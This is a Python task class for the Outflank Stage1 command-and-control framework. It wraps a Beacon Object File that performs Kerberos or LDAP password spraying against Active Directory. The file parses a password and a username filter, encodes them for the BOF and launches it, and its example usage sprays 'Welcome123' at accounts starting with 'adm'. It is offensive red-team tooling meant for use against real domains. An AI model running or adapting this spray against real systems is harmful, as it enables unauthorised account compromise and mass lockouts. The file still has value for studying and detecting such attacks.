from typing import List, Tuple

from outflank_stage1.task.base_bof_task import BaseBOFTask
from outflank_stage1.task.enums import BOFArgumentEncoding
from outflank_stage1.task.exceptions import TaskInvalidArgumentsException


class SprayAD(BaseBOFTask):
    def __init__(self):
        super().__init__("SprayAD")

        self.parser.add_argument("password", help="The password to spray.")

        self.parser.add_argument(
            "filter",
            default="*",
            nargs="?",
            help="Username filter to use, such as admin* (default = *).",
        )

        self.parser.add_argument(
            "ldap",
            choices=["ldap"],
            metavar="ldap",
            nargs="?",
            help="Use LDAP instead of Active Directory.",
        )

        self.parser.description = "Perform a Kerberos or LDAP password spraying attack against Active Directory."
        self.parser.epilog = (
            "Example usage:\n"
            "  - Kerberos password spray:\n"
            "    SprayAD Welcome123\n"
            "  - Kerberos password spray with account filter to target accounts beginning with adm:\n"
            "    SprayAD Welcome123 adm*\n"
            "  - LDAP password spray\n"
            "    SprayAD Welcome123 ldap"
        )

    def validate_arguments(self, arguments: List[str]):
        super().validate_arguments(arguments)

        parser_arguments = self.parser.parse_args(arguments)
        stripped_password = parser_arguments.password.lstrip('"').rstrip('"')

        if len(stripped_password) == 0:
            raise TaskInvalidArgumentsException("Please specify a password to spray.")

    def rewrite_arguments(self, arguments: List[str]) -> List[str]:
        if len(arguments) == 2 and arguments[1] == '""':
            arguments[1] = "*"

        if len(arguments) == 2 and arguments[1] == "ldap":
            arguments[1] = "*"
            arguments.append("ldap")

        return arguments

    def _encode_arguments_bof(
        self, arguments: List[str]
    ) -> List[Tuple[BOFArgumentEncoding, str]]:
        parser_arguments = self.parser.parse_args(arguments)

        encoded_arguments = [
            (
                BOFArgumentEncoding.WSTR,
                parser_arguments.password.lstrip('"').rstrip('"'),
            ),
            (BOFArgumentEncoding.WSTR, parser_arguments.filter),
        ]

        if "ldap" in parser_arguments and parser_arguments.ldap == "ldap":
            encoded_arguments.append((BOFArgumentEncoding.WSTR, "ldap"))

        return encoded_arguments

    def run(self, arguments: List[str]):
        parser_arguments = self.parser.parse_args(arguments)

        self.append_response(
            f'Let\'s start spraying user accounts with password "{parser_arguments.password}"\n\n'
        )
        super().run(arguments)
